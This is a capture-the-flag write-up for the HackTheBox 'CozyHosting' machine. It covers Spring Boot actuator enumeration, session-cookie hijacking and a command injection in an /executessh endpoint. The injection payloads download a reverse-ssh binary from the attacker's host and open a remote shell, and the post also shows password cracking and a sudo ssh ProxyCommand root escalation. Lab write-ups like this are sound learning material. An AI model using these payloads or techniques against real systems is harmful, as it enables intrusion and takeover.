---
title: CozyHosting
date: 2023-09-19
categories: [HackThebox, Easy-HTB]
tags: [cms, gtfo-bins, linux, spring]     # TAG names should always be lowercase
---


# Recon

```bash
curl -s 10.10.11.230 -v 2>&1 | grep "Location" | awk '{print $3}'
http://cozyhosting.htb

```

we got `cozyhosting.htb` as the host, now lets edit out `/etc/hosts` to resolve
the host

`echo "10.10.11.230 cozyhosting.htb" >> /etc/hosts`

Now we can navigate to `http://cozyhosting.htb` in our browser

```bash
❯ gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 12706]
/login                (Status: 200) [Size: 4431]
/admin                (Status: 401) [Size: 97]
/logout               (Status: 204) [Size: 0]
/error                (Status: 500) [Size: 73]

```

After spending some time trying to login i kinda feel bored, so time to enum
more

![img](/assets/img/hackthebox/cozyhosting/error_label.png)

Aight nvm, we got the whitelabel error aka spring hosting this. our next move will be looking for /actuator and other spring endpoints

```bash
❯ gobuster dir -u http://cozyhosting.htb -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cozyhosting.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/spring-boot.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/actuator             (Status: 200) [Size: 634]
/actuator/env         (Status: 200) [Size: 4957]
/actuator/env/home    (Status: 200) [Size: 487]
/actuator/env/lang    (Status: 200) [Size: 487]
/actuator/env/path    (Status: 200) [Size: 487]
/actuator/health      (Status: 200) [Size: 15]
/actuator/mappings    (Status: 200) [Size: 9938]
/actuator/beans       (Status: 200) [Size: 127224]
/actuator/sessions    (Status: 200) [Size: 48]
Progress: 112 / 113 (99.12%)
===============================================================
Finished
===============================================================
```

contents of /actuator

```json
{
  "_links": {
    "self": {
      "href": "http://localhost:8080/actuator",
      "templated": false
    },
    "sessions": {
      "href": "http://localhost:8080/actuator/sessions",
      "templated": false
    },
    "beans": {
      "href": "http://localhost:8080/actuator/beans",
      "templated": false
    },
    "health": {
      "href": "http://localhost:8080/actuator/health",
      "templated": false
    },
    "health-path": {
      "href": "http://localhost:8080/actuator/health/{*path}",
      "templated": true
    },
    "env": {
      "href": "http://localhost:8080/actuator/env",
      "templated": false
    },
    "env-toMatch": {
      "href": "http://localhost:8080/actuator/env/{toMatch}",
      "templated": true
    },
    "mappings": {
      "href": "http://localhost:8080/actuator/mappings",
      "templated": false
    }
  }
}
```



well, what can do with this is view /sessions to see the current logged in Users

```bash
curl http://cozyhosting.htb/actuator/sessions | jq . 
{
  "3D5353CA928B56E348E3968206F168C1": "kanderson",
  "DE841EDDDD2E6FE93B22033CA7EC0CB7": "UNAUTHORIZED"
}
```

Alright thats a very good news, we can our Unauthorized session, as well as the user kanderson session alongside JSESSIONID, Lets use burp to intercept the request and change the cookie to kanderson's. 

![img](/assets/img/hackthebox/cozyhosting/burp_cookie.png)


# FootHold
And guess what? it works. aight, so thats nice now what next
![img](/assets/img/hackthebox/cozyhosting/foothold.png)

![img](/assets/img/hackthebox/cozyhosting/curl_command.png)

Playing around reveals another endpoint /executessh. since i have control over the input send to the endpoint, from the endpoint name i make a guess there might a command injection. So i use sleep and monitor the response time, and it certain work. what what left is crafting a shell


```bash
# first off get the binary from this github repo: Fahrj/reverse-ssh

# download reverse-ssh
curl -X POST "http://cozyhosting.htb/executessh" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: JSESSIONID=16C0AD81790D8BB7FC2BECE1618F1B32" -d 'host=google&username=;curl${IFS}http://10.10.14.39:8000/rev${IFS}-o${IFS}/tmp/revshell;' -vv

# mark reverse-ssh as executable
curl -X POST "http://cozyhosting.htb/executessh" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: JSESSIONID=16C0AD81790D8BB7FC2BECE1618F1B32" -d 'host=google&username=;chmod${IFS}777${IFS}/tmp/revshell;' -vv

# run reverse-ssh on target
curl -X POST "http://cozyhosting.htb/executessh" -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: JSESSIONID=16C0AD81790D8BB7FC2BECE1618F1B32" -d 'host=google&username=;/tmp/revshell${IFS}-pa${IFS}9001${IFS}10.10.14.39;' -vv

# catch the shell locally
./rev -l -v -p 9001

# ssh to the victim machine
ssh -p 8888 127.0.0.1

#password "letmeinbrudipls"
```


# User Flag

After looking around, nothing really seems to be that much interesting. all services running we already know them. but hold a sec, there's postgres running maybe we can the josh login creds. i downloaded the project and run grep on it. lucky i found the password and username `postgres:Vg&nvzAQ7XxR`

Now lets check postgres, hopefully we find something worthy of our time.
![img](/assets/img/hackthebox/cozyhosting/postgres.png)

it takes around 4m for john to crack the user password `josh:manchesterunited`

![img](/assets/img/hackthebox/cozyhosting/sudol.png)

# Root Flag

alright josh can run ssh as root, our next destination is gtfo bins
`sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x`
![img](/assets/img/hackthebox/cozyhosting/root.png)

and finally root the box. 
Thanks for reading and i hope this helps :)